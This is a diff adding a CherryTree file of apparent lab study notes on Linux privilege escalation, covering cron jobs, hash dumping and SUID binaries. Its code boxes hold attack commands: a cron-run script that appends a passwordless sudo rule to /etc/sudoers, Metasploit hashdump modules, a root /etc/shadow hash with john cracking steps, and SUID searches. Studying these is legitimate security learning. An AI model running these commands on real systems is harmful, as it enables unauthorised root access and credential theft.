@@ -1,0 +1,82 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="privesc - linux" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704141698" ts_lastsave="1704143002">
+    <rich_text underline="single" weight="heavy">GTFO Bins</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">Cron </rich_text>
+    <rich_text>
+jobs are timed or scheduled tasks to perform repetitive tasks. In some cases this is a script, command, or application set to run at a specific time.
+
+Cron jobs can be configured by any user on the system. However, we will want to target ones created by the root user as they will be set to run with root privs. These can be used to run applications or binaries that could be used to start a shell, etc.
+
+commands
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+NOTE: This was pretty neat to do as there was no text editor I had access to on the system:
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">Dump Hashes</rich_text>
+    <rich_text>
+With Linux, you cannot authenticate with the hashes like you can with Windows. You will need to crack them.
+
+All password hashes are stored in /etc/shadow but you will require elevated priveleges to review.
+
+Use this to read the file: </rich_text>
+    <rich_text link="webs https://www.cyberciti.biz/faq/understanding-etcshadow-file/">https://www.cyberciti.biz/faq/understanding-etcshadow-file/</rich_text>
+    <rich_text>
+
+Metasploit:
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Cracking with John for improved speeds:
+
+</rich_text>
+    <rich_text link="webs https://erev0s.com/blog/cracking-etcshadow-john/">https://erev0s.com/blog/cracking-etcshadow-john/</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">SUID Binaries</rich_text>
+    <rich_text>
+In additioin to read write and execute Linux also allows SUID (set owner user ID ). These are used to provide users the ability to execute a script or binary with the perms of the file owner as opposed to the user that is running the binary.
+
+This is often used as a workaround to allow unpriveleged users to perform priveleged tasks as "root". When configured incorrectly this can translate to a privelege escalation.
+
+For this to be successful you will need to find a binary that matches the following:
+
+ 1. owned by user
+ 2. that non priveleged account has been given access to run
+
+commands:
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <codebox char_offset="459" justification="left" frame_width="730" frame_height="55" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crontab -l #lists cron jobs owned by that user 
+grep -rnw /usr -e "/home/user/message" #greps for any mention of a file path very useful </codebox>
+    <codebox char_offset="554" justification="left" frame_width="1314" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" &gt;&gt; /etc/sudoers' &gt; /usr/local/share/copy.sh #gives student account access to sudo all binaries without creds.</codebox>
+    <codebox char_offset="877" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">post/linux/gather/hashdump
+auxiliary/analyze/crack_linux</codebox>
+    <codebox char_offset="920" justification="left" frame_width="1162" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7::: #line in /etc/shadow
+
+#from attack box
+unshadow passwd.txt shadow.txt &gt; unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+</codebox>
+    <codebox char_offset="1582" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm /4000 #will find suid
+find / -perm /2000 #will find sgid
+find / -perm /6000 #will find SUID and SGID</codebox>
+  </node>
+</cherrytree>
